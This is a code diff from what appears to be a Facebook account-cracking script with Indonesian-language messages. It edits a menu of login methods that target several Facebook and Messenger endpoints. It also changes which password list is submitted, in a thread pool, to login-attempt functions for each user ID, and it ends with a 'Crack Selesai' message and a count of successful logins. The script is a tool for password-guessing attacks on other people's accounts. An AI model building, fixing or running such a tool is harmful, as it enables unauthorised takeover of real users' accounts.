@@ -964,8 +964,8 @@ def setting():
 	prints(nel(f'                         [bold blue]login Method', style=f"bold purple")) 
 	prints(f'{H2}╰─▶ {B2}01 [bold purple]Method free.facebook.com [green] Validate [white]\n')
 	prints(f'{H2}╰─▶ {B2}02 [bold purple]Method m.facebook.com [green] Async [white]\n')
-	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [green] B-Api [white]')
-	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method www.messenger.com [green] Messenger [white]')
+	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [green] B-Api [white]\n')
+	prints(f'{H2}╰─▶ {B2}04 [bold purple]Method www.messenger.com [green] Messenger [white]')
 	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if hc in ['1','01']:
 		method.append('metod1')
@@ -1036,15 +1036,15 @@ def passwrd():
 					pwv.append(xpwd)
 			else:pass
 			if 'metod1' in method:
-				pool.submit(_validate_,uid,pwv)
+				pool.submit(_validate_,uid,pasw)
 			elif 'metod2' in method:
-				pool.submit(_async_,uid,pwv)
+				pool.submit(_async_,uid,pasw)
 			elif 'metod3' in method:
-				pool.submit(_api_,uid,pwv)
+				pool.submit(_api_,uid,pasw)
 			elif 'metod4' in method:
-				pool.submit(_messenger_,uid,pwv)
+				pool.submit(_messenger_,uid,pasw)
 			else:
-				pool.submit(_validate_,uid,pwv)
+				pool.submit(_validate_,uid,pasw)
 	print('')
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
